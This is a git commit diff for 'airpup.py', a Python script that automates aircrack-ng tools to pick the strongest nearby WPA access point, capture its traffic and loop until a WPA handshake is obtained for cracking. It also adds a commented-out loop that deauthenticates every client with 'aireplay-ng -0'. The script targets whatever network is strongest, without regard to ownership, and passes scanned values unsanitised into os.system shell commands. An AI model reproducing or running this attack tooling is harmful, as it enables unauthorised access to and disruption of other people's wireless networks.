71d83c273c6a43889302f136527f2ffd24855736
Luke <arntsonl@gmail.com>
2015-09-26 12:15:08 -0400

    Use the bssid rather than essid to identify AP points, use wpaclean to determine if we have found a handshake (stop running). Temporary de-auth built in, right now its WIP.

--- airpup.py
+++ airpup.py
@@ -3,14 +3,14 @@ import time
 from subprocess import Popen, call
 
 # Don't try to read these (known APs)
-blackList = [ "Example AP" ]
+blackList = [ "BSSIDGOESHERE" ]
 
 # setup airmon assuming we have a wlan0 card
 call(["airmon-ng", "stop", "wlan0"])
 call(["airmon-ng", "start", "wlan0", "1"])
 
 # setup airodump on a timer
-p = Popen(["airodump-ng", "wlan0mon", "-o" ,"csv", "-w", "airattacktmp"])
+p = Popen(["airodump-ng", "wlan0mon", "-o" ,"csv", "-w", "airpuptmp"])
 
 # run for 60 seconds, then terminate the process
 timeout = 60
@@ -22,9 +22,9 @@ if p.poll() is None:
     p.wait()
 
 # parse the Airodump CSV file
-with open('airattacktmp-01.csv') as f:
+with open('airpuptmp-01.csv') as f:
     bssids = f.read().split("\r\n\r\n")[0]
-
+	
 keys = ['bssid', 'first_seen', 'last_seen', 'channel', 'speed', 'privacy', 'cipher', 'authentication', 'power', 'beacons', 'ivs', 'lan', 'id-length', 'essid', 'key']
 cells = []
 for line in bssids.split('\r\n')[2:]:
@@ -33,16 +33,53 @@ for line in bssids.split('\r\n')[2:]:
         cells.append(cell)
 
 # delete our temporary file
-os.remove("airattacktmp-01.csv")
+os.remove("airpuptmp-01.csv")
 
 # lets find the best cell based on the signal strength
 bestCell = None
 bestSignal = 999
 for cell in cells:
-    if abs(int(cell["power"])) < bestSignal and 'WPA' in cell["privacy"] and cell["essid"] not in blackList:
+    if abs(int(cell["power"])) < bestSignal and 'WPA' in cell["privacy"] and cell["bssid"] not in blackList:
         bestSignal = abs(int(cell["power"]))
         bestCell = cell
 
 # Target acquired, start airodumping our target bssid
 print "Target Acquired - " + bestCell["essid"]
-call(["airodump-ng", "wlan0mon", "-c", bestCell["channel"], "--bssid", bestCell["bssid"], "-w", bestCell["essid"]])
+
+# setup airodump
+p = Popen(["airodump-ng", "wlan0mon", "-c", bestCell["channel"], "--bssid", bestCell["bssid"], "-w", bestCell["bssid"]])
+
+# check the handshake every 10.0 seconds
+checkHandshake = 10.0
+handshakeFound = False
+while handshakeFound == False:
+    time.sleep(checkHandshake)
+
+    # de-authenticate every client :[]
+    # keys = ['mac', 'first_seen', 'last_seen', 'power', '# packets', 'bssid', 'essid']
+    # clients = []
+    # for line in bssids.split('\r\n')[6:]:
+    #     client = dict(zip(keys, [client.strip() for client in line.split(',')]))
+    #     clients.append(client)
+    
+    # for client in clients:
+    #     os.system("aireplay-ng -0 5 -a " + bestCell["bssid"] + " -c " + client["mac"] + " wlan0mon")
+
+    # use wpaclean to filter out handshakes and beacons
+    os.system('cp ' + bestCell["bssid"] + '-01.cap tmp.cap')
+    os.system('wpaclean airpuptmp.cap tmp.cap')
+    os.system('rm -rf tmp.cap')
+    
+    # use tshark to filter our handshake
+    f = open('airpuptmp.cap', 'rb')
+    bytes = f.read()
+    f.close()
+    if len(bytes) > 24:
+        handshakeFound = True
+
+# do not dump anymore, we are finished
+if p.poll() is None:
+    p.terminate()
+    p.wait()
+    
+print "Found handshake, Airpup complete [+]"
